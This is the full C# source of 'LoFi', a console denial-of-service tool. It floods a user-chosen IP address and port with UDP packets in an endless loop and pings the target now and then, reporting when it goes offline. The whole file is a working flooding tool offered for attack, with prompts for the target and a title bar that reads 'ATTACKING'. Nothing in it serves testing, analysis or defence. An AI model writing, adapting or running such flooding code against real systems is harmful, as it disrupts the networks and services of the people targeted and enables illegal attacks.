using System;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;

namespace LoFi
{
    class Program
    {
        // Title variable
        private static readonly string title = @"

              ██▓        ▒█████       █████▒    ██▓
             ▓██▒       ▒██▒  ██▒   ▓██   ▒    ▓██▒
             ▒██░       ▒██░  ██▒   ▒████ ░    ▒██▒
             ▒██░       ▒██   ██░   ░▓█▒  ░    ░██░
             ░██████▒   ░ ████▓▒░   ░▒█░       ░██░
             ░ ▒░▓  ░   ░ ▒░▒░▒░     ▒ ░       ░▓  
             ░ ░ ▒  ░     ░ ▒ ▒░     ░          ▒ ░
               ░ ░      ░ ░ ░ ▒      ░ ░        ▒ ░
                 ░  ░       ░ ░                 ░  
                                      ";


        // Parameter Variables
        private static string address; // This variable acts as the target
        private static string payload; // This variable is the input on how many bytes of data should be sent in a packet
        private static string delayer; // This variable handles the delay between packet launches
        private static string netport; // This variable handles the port number which should be attacked
        private static string pingers; // This variable handles the delay between IMCP Echo requests.

        // Payload parsed value
        private static string parseload = "";

        // Main menu panel
        private static void Main(string[] args)
        {
            // Set console size and color
            Console.SetWindowSize(65, 25);
            Console.BackgroundColor = ConsoleColor.Black;


            // Write titles
            Color(6);
            Console.Clear();
            Console.Title = "♫  L O F I  ( v 1 . 1 )  ♫";
            Console.WriteLine(title);
            Color(0);

            // Set parameters
            Parameters("Enter the IP Address of your target.", 1);
            Parameters("Enter the port number of your target.", 2);
            Parameters("Enter your desired packet size (bytes).", 3);
            Parameters("Enter your desired UDP packet delay (milliseconds).", 4);
            Parameters("How often would you like to test your connection?", 5);

            // Convert payload parameter to how many zeroes represented in the variable
            for (int i = 0; i < int.Parse(payload); i++)
            {
                parseload += "0";
            }

            // Attack the target
            Attack();
        }

        // Set parameters
        private static void Parameters(string question, int switcher)
        {
            Color(4);
            Console.Write("╔═ ");
            Color(6);
            Console.Write("♫ ");
            Color(0);
            Console.Write(question);
            Color(6);
            Console.Write(" ♫");
            Console.WriteLine();
            Color(4);
            Console.Write("╚══ ");
            Color(0);
            string input = Console.ReadLine();

            // Actually assign the input to the parameters
            switch (switcher)
            {
                case 1:
                    address = input;
                    break;
                case 2:
                    netport = input;
                    break;
                case 3:
                    payload = input;
                    break;
                case 4:
                    delayer = input;
                    break;
                case 5:
                    pingers = input;
                    break;
            }
        }

        // Attack the target
        private static void Attack()
        {
            Console.WriteLine();

            // Animates the title
            Thread attackontitle = new(Animation);
            attackontitle.Start();

            // Create a new socket for UDP packout outflow
            Socket flooder = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            byte[] floodload = Encoding.ASCII.GetBytes(parseload);
            IPEndPoint endpoint = new(IPAddress.Parse(address), int.Parse(netport));

            // Create integers used in attacking process
            int i = 0; // Used for IMCP Echo control
            int pluscolor = 1; // Used to controllm text color
            int packets = 0; // Used to count the total packets sent

            // Loop attack process
            while (true)
            {
                // Attempt to send UPD packet
                try
                {
                    flooder.SendTo(floodload, endpoint);
                    packets++;
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
                i++;

                if (i == int.Parse(pingers))
                {
                    // Do some garbage collection
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    GC.Collect();

                // Ping target to check if it's still online
                pingattempt:
                    Color(pluscolor);
                    Ping pingSender = new();
                    byte[] buffer = Encoding.ASCII.GetBytes("abcdefghijklmnopqrstuvwabcdefghi");
                    int timeout = 10000;
                    PingOptions options = new(64, true);
                    try
                    {
                        // Print offline message and/or packet diagnostics
                        PingReply reply = pingSender.Send(address, timeout, buffer, options);
                        if (reply.Status == IPStatus.Success)
                        {
                            Console.WriteLine("♫ Pinged : " + address + " : " + netport + " : TTL " + reply.Options.Ttl + "ms : RT " + reply.RoundtripTime + "MS : " + packets + "*" + payload);
                            i = 0;
                        }
                        else
                        {
                            Color(0);
                            Console.WriteLine("♫  O F F L I N E  ♫");
                            Console.Beep();
                            goto pingattempt;
                        }

                        pluscolor++;
                        if (pluscolor == 7)
                        {
                            pluscolor = 1;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex);
                    }
                }

                // Delay packets
                Thread.Sleep(int.Parse(delayer));
            }
        }

        // Color changing algorithm
        private static void Color(int value)
        {
            switch (value)
            {
                case 0:
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                case 1:
                    Console.ForegroundColor = ConsoleColor.Red;
                    break;
                case 2:
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    break;
                case 3:
                    Console.ForegroundColor = ConsoleColor.Green;
                    break;
                case 4:
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    break;
                case 5:
                    Console.ForegroundColor = ConsoleColor.Blue;
                    break;
                case 6:
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    break;
            }
        }

        // Animates the title
        private static void Animation()
        {
            while (true)
            {
                Console.Title = "♫ A T T A C K I N G";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G .";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G . .";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G . . .";
                Thread.Sleep(150);
            }
        }
    }
}